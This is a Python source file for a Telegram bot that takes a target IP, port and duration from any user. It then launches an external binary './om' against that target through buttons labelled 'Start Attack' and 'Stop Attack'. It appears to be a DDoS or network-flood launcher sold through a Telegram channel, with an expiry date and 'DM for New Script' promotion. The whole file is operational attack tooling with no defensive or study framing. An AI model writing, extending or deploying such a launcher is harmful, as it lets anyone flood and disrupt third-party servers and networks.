import subprocess
import logging
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, ContextTypes, filters
from flashh import TOKEN  # Import the TOKEN variable
from datetime import datetime
import asyncio
import signal

# Logging setup
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# Constants
BINARY_PATH = "./om"
EXPIRY_DATE = datetime(2024, 12, 29)  # Expiry date

# Global variables
process = None
target_ip = None
target_port = None
attack_time = None

# Function to check expiry
def check_expiry():
    return datetime.now() > EXPIRY_DATE

# Start command
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if check_expiry():
        keyboard = [[InlineKeyboardButton("SEND MESSAGE", url="https://t.me/FLASH_502")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text(
            "🚀This script has expired. DM for New Script. Made by t.me/FLASH_502",
            reply_markup=reply_markup
        )
        return

    keyboard = [[InlineKeyboardButton("🚀Attack🚀", callback_data='attack')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        "By t.me/flashmainchannel 🚀Press the Attack button to start CHIN TAPAK DUM DUM (●'◡'●)",
        reply_markup=reply_markup
    )

# Handle button clicks
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global process, target_ip, target_port, attack_time
    query = update.callback_query
    await query.answer()

    if query.data == 'attack':
        await query.message.reply_text(
            "By https://t.me/FLASH_502 Please enter the target, port, and time in the format:<target> <port> <time>🚀🚀"
        )
    elif query.data == 'start_attack':
        if process is None:
            try:
                process = subprocess.Popen([BINARY_PATH, target_ip, str(target_port), str(attack_time)])
                await query.message.reply_text(
                    f"CHIN TAPAK DUM DUM(●'◡'●) FeedBack De Dio Yaad se 😡 :- 👉 https://t.me/FLASH_502 {target_ip}:{target_port} for {attack_time} seconds"
                )
            except Exception as e:
                logger.error(f"Error starting attack: {e}")
                await query.message.reply_text("Error starting attack.")
        else:
            await query.message.reply_text("Attack is already running.")
    elif query.data == 'stop_attack':
        if process:
            process.terminate()
            process = None
            await query.message.reply_text("CHIN TAPAK DUM DUM ROK DIYA GYA H (●'◡'●)")
        else:
            await query.message.reply_text("No attack is currently running.")
    elif query.data == 'reset_attack':
        target_ip = None
        target_port = None
        attack_time = None
        await query.message.reply_text("Attack reset. Please enter the target, port, and time again.")

# Handle user input
async def handle_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global target_ip, target_port, attack_time
    try:
        target, port, time = update.message.text.split()
        target_ip = target
        target_port = int(port)
        attack_time = int(time)

        keyboard = [
            [InlineKeyboardButton("Start Attack🚀", callback_data='start_attack')],
            [InlineKeyboardButton("Stop Attack❌", callback_data='stop_attack')],
            [InlineKeyboardButton("Reset Attack⚙️", callback_data='reset_attack')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text(
            f"Target: {target_ip}, Port: {target_port}, Time: {attack_time} seconds configured. Now choose an action:",
            reply_markup=reply_markup
        )
    except ValueError:
        await update.message.reply_text("Invalid format. Use: <target> <port> <time>🚀")

# Graceful shutdown
async def shutdown(application):
    await application.shutdown()
    await application.stop()
    await application.update_queue.put(None)
    logger.info("Bot stopped successfully.")

# Signal handling
def signal_handler(sig, frame, application):
    logger.info(f"Received signal {sig}. Shutting down gracefully...")
    asyncio.get_event_loop().run_until_complete(shutdown(application))

# Main function
def main():
    application = Application.builder().token(TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CallbackQueryHandler(button_handler, pattern='^(attack|start_attack|stop_attack|reset_attack)$'))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_input))

    signal.signal(signal.SIGINT, lambda sig, frame: signal_handler(sig, frame, application))
    signal.signal(signal.SIGTERM, lambda sig, frame: signal_handler(sig, frame, application))

    try:
        logger.info("Bot is starting...")
        application.run_polling()
    except Exception as e:
        logger.error(f"An error occurred: {e}")

if __name__ == "__main__":
    main()
